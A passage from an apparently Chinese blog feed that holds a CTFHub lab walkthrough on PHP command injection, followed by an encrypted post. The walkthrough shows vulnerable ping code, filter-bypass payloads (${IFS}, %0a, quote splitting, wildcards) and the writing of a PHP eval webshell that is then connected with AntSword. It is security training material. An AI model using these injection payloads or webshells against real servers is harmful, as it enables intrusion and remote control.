src="https://img-blog.csdnimg.cn/20201210184652619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>发现了25900911724350.php<br><img src="https://img-blog.csdnimg.cn/20201211103127797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用cat读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php<br></code></pre></td></tr></table></figure><p>无回显，可能存在字符编码无法显示出来<br><img src="https://img-blog.csdnimg.cn/20201210184802952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看网页源代码<br><img src="https://img-blog.csdnimg.cn/20201211103237831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以利用管道符，通过base64的形式显示文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php|base64<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201211103751285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201210185039373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还可以写码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; a.php <br></code></pre></td></tr></table></figure><p>执行<code>?ip=;ls</code>，发现写入成功<br><img src="https://img-blog.csdnimg.cn/20201211104044953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>蚁剑连接，数据返回为空<br><img src="https://img-blog.csdnimg.cn/20201211104308449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>需要注意echo命令会调用<code>$_POST</code>导致原始文件中没有,一句话木马里面 <code>$_POST</code> 前加上  <code>\</code>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; b.php <br></code></pre></td></tr></table></figure><p>b.php写入成功<br><img src="https://img-blog.csdnimg.cn/20201211104639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连接成功<br><img src="https://img-blog.csdnimg.cn/20201211104731952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤cat"><a href="#命令注入-过滤cat" class="headerlink" title="命令注入-过滤cat"></a>命令注入-过滤cat</h2><p>题目描述：过滤了cat命令之后，你还有什么方法能读到 Flag?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/cat/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>发现了flag_22422157929595.php<br><img src="https://img-blog.csdnimg.cn/20201211110314508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>题目说过滤了cat，绕过cat</p><ol><li> 单引号或双引号绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-string">&#x27;&#x27;</span>t flag_22422157929595.php<br>?ip=|ca<span class="hljs-string">&quot;&quot;</span>t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>反斜杠绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca\t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>利用Shell 特殊变量绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-variable">$@t</span>  flag_22422157929595.php<br>?ip=|ca<span class="hljs-variable">$1t</span>  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>linux中直接查看文件内容的命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat、tac、more、less、head、tail、file -f、nl、sed、sort、uniq<br><br>cat： 由第一行开始显示档案内容<br>tac： 从最后一行开始显示，可以看出 tac 是 cat 的反向显示！<br>nl： 显示的时候，随便输出行号！<br>more： 一页一页的显示档案内容<br>less 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页！<br>head： 查看头几行<br>tail： 查看尾几行<br>od： 以二进制的方式读取档案内容！<br>最常使用的显示档案内容的指令可以说是 cat ，more 及 less 了！<br></code></pre></td></tr></table></figure></li></ol><p>   cat被过滤了，可以使用其他命令，花式Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|tac flag_22422157929595.php<br>?ip=|more flag_22422157929595.php<br>?ip=|less flag_22422157929595.php<br>?ip=|head flag_22422157929595.php<br>?ip=|tail flag_22422157929595.php<br>?ip=|file -f flag_22422157929595.php<br>?ip=|nl flag_22422157929595.php<br>?ip=|sed flag_22422157929595.php<br>?ip=|sort flag_22422157929595.php<br>?ip=|uniq flag_22422157929595.php<br></code></pre></td></tr></table></figure><h2 id="命令注入-过滤空格"><a href="#命令注入-过滤空格" class="headerlink" title="命令注入-过滤空格"></a>命令注入-过滤空格</h2><p>题目描述：这次过滤了空格，你能绕过吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先查询目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116153811306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|cat flag_177172732728132.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116154101457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>空格被过滤了，用以下字符代替空格：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt; 、&lt;&gt;、%<span class="hljs-number">20</span>(space)、%<span class="hljs-number">09</span>(tab)、$IFS$<span class="hljs-number">9</span>、 $&#123;IFS&#125;、<span class="hljs-variable">$IFS</span>  <br></code></pre></td></tr></table></figure><p>新的Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|cat<span class="hljs-variable">$&#123;IFS&#125;</span>flag_177172732728132.php<br></code></pre></td></tr></table></figure><p>查看源代码即可得到flag</p><h2 id="命令注入-过滤目录分隔符"><a href="#命令注入-过滤目录分隔符" class="headerlink" title="命令注入-过滤目录分隔符"></a>命令注入-过滤目录分隔符</h2><p>题目描述：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/\//&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>老规矩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116134511443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一些命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">linux中：%<span class="hljs-number">0</span>a 、%<span class="hljs-number">0</span>d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%<span class="hljs-number">0</span>a、&amp;、|、%<span class="hljs-number">1</span>a（一个神奇的角色，作为.bat文件中的命令分隔符）<br></code></pre></td></tr></table></figure><p>由于过滤了目录分隔符 <code>/</code>  ，需要切换到相应目录，并使用 <code>;</code> 分隔符连续执行指令　</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;<span class="hljs-built_in">cd</span> flag_is_here;ls<br></code></pre></td></tr></table></figure><p>cd  进入flag_is_here目录，ls  显示flag_is_here目录里的内容。<br><img src="https://img-blog.csdnimg.cn/20210116134947994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_3708221509571.php<br></code></pre></td></tr></table></figure><p>查看源代码，拿到flag<br><img src="https://img-blog.csdnimg.cn/20210116135639397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤运算符"><a href="#命令注入-过滤运算符" class="headerlink" title="命令注入-过滤运算符"></a>命令注入-过滤运算符</h2><p>题目描述：过滤了几个运算符, 要怎么绕过呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||\&amp;)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从代码中，可以看出过滤了 <code>|</code> 与 <code>&amp;</code>运算符 ，那我们就使用 <code>;</code> 分隔符绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=;ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116140338276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;cat flag_64982941521735.php<br></code></pre></td></tr></table></figure><p>查看源代码<br><img src="https://img-blog.csdnimg.cn/20210116140509312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>题目描述：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码，发现过滤了<code>|、&amp;、;、空格、/、cat</code>，以及<code>flag和ctfhub</code>等关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.查看目录结构：<br>源命令：|ls<br><span class="hljs-comment">#%0a代替运算符|</span><br>Payload:?ip=%0als<br><br>2.查看flag_is_here文件夹下的文件<br>源命令：;<span class="hljs-built_in">cd</span> flag_is_here;ls<br><span class="hljs-comment">#%0a绕过运算符和;</span><br><span class="hljs-comment">#$&#123;IFS&#125;代替空格</span><br><span class="hljs-comment">#flag被过滤了，使用通配符*绕过</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0als<br><br>3.查看flag文件内容<br>源命令：?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_216371105627974.php<br><span class="hljs-comment">#使用more代替cat</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0amore%09*_216371105627974.php <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（四）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="http://atkx.top/tags/CTFhub/"/>
    
    <category term="命令执行" scheme="http://atkx.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>线下AWD攻防赛总结</title>
    <link href="http://atkx.top/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://atkx.top/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-16T04:03:43.000Z</published>
    <updated>2021-05-17T14:35:32.052Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码不正确。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="b69457d6dc85e03c460c49fa1ef6889e3a2e2dcf0f3301784c2769d594e28c2e">fb006b16b8e5177c9c740fc4ecc8cf66a82acd6888d2edb52d5f9c2e2e990fc0db9c929653526f1214957a42441ca59c2d5f0f20d616c290f7d7f72fd71018b30d6d2bb60d9e5d885d04fe90fad7421b8e5e6b8709f4e872e05dffc5861375706d3f9865827b0dd8b6f9e5ac84b26ebc95578126c89aabb263da3e85461f614c9c9fcd34068abae0a4b84ce4d14bb64c8d5d7fca30f60280edfc8e818b7cc7fbe1e7a30f48fc639abbd6cc33fc28429ea8ed3c0766e5af661d6a7a28e1dfcededbfe1c0378f608bc12c3d619050664c23baac897b899cd6089486114cc2c716ad53209dec60e93d13f57000e14f4affb1d2ec3d18cb54247df5c0b117b80feef8766f04bc72288d4ef1546b3513636531ef4c3fae902adea48f309298949129b313651b265e509acfa15af67aeb9f0a9096ab90b5b26b4f351e1afd57fd74334606c460a84458618f7d6a79c0c19c6fb5a0314c8e101cf4d5f22d38e8b78b6e51e618b3dce972037f1b619b8c833fe0ef978167c83bc02e18da78bc3529aa3755db666440869cea64c4174f525ae92d95540cfe969b332781f338e207b57c66f5de4943600a3542e68b0ae668e2a3c87b323825b5eb1d3d0089ab0a377b5fd9eac5a6f1e3020656539351258b3175dd56c408103decd56fef54144b36ff9849e4e3d63923c4b109621837bc0dcf88442b92b3cac3509d334026227a95fe23cdd6ec1f4d881b083ba522253c29da72e0c358276be1794b4c63629d778fc25e2a6b3e06d05ac3e734f18ffebd9276ac432206bccf7037f0076888aa871af1e674f8cc20c2816dc8217fc04105a53b1d09780de43f5886abccc18624bcd5776073ab2a563bc35f1153fb2715a9002fa27c2887ef8c595e63f7ecdd7c569e390bbd54fcb7d4c1ef3b46c94bec856d55da21b83b97c7403d9c92706eb66bc164751d4793b520f9e9d949ba47f8961673fabc81b533262970094ae739169c13d3786fba4da3c484db1b60bbb46ec4ee561eaf01b78d4257ca0732f814b12df630e961c6d36c50be28f7334951cdfc1a7eca82ccdba355b50ab99431f2bb5a5411521cfc01746cf4d20e156f486d58da5a65fd4e130ae145194708d827af128a213f5c25182b05bc090b9dd0c54c000ad84831085ea56e0139834dbee9ed315e740867d1d75528020e3031ca1cafb247fc96b31b4af1f311391493851267f60cff37b559d2fe39e1945ba19cf96c78c3b8358b044e12a56eb5a4a022fb866ad15ef5af70844759ce8b2cbe1b26367fbc3cea7635afbaf19fcea4ea9fbcc5134afe088b1e18ed27923b6417b9c5fedbda8d1252a66a1ea61d0ae0101e31320a2138efddbd37e7981613903cedb25ce4581a4c6c13627b22a2712073682669caab3a2f7c104bf9c1a6647388a01e538d2f7a080cd6b7bcb7b6c5775f047cc854067e04caf2622869633d4c3572566db5e711c2b4208dc33303beee404387486cd2710bd51fb721a55021e25896e9ab6490dfc0f706d846e8408d1ba841302f5cc113913d7103219ba70cf41f5f8c55f7504bf5efd9c743d84d97dcdde8b93e9595d7812a95e51d7d4e6a0679dedabda4825d61dc6cce5fc443214264d9c95db8952d6735d120dc118a97f28c3c3a7afa7c2a3cd8411714cccfc8cc7ed125b84e30127a816b967b1970a842a565dd8f38db74fc5a7f5e8b9e318bdb9b782a35a781cd0be9052a0a2405c0544a9c42b8994c9ec8a186a8d900aae3db33d067c6c927b394912f95476c4a1b40fbb2d4e5d71eb5c83caf804292fe0fd6c5bf8a440a541f5b48549a6dda9973ef56250752d0aa3ea6c7d374c7b5f19932c11a58ee7a32e1dc8a45972246d44ca5caeef4fa6a3955f32a012dcaa5c8373a3b316a887208565dc23b50a7e773af74a08dc7212ebc512df49db5aa0e0bd81ce01237f9ef2fee2a1a72cb1b284952d485e0aa339eebbe73c66febfa3b033db8b58bf1051d86280c1037e8893733935deb8191b7cae5ba3658bc41957183109cc6543daf5c2eadebff7c45404ef5669c8c43774bf659f65edcc6c2b0168ef3a76908adca2a6cf30f78d95403d0f9bacd910f66bda88f00f981bce8808a5b3890b2f626f8ba75db0a7500b14986201c9e6a990980046ae91d46f72ee8ded436b07cafb956c968b627af3d63dd4e2892e2750a2a6171f3d743070d0e03c90ce1f1be3b5cf8ac9bccd061dba00d72bfe116e6545c7b38a13b1c2d5d5bae04bd6ce7bb0b1760359c230bfd00397094e322fdf1b09740d66fa42ab2cf35a2c4f8ceede7e0d4c1a628648018e00aaead5e064a46ed2a7acf82ad1b9f8fe0ba7376298881553c74ece6d4a8664743c6ee10106babcb40b2802be367d5b6e210ff238facfdb6b80091f044840d5cbe66332b206fdb984f26f7ef32927a5921ebba6efe4ebb0febcf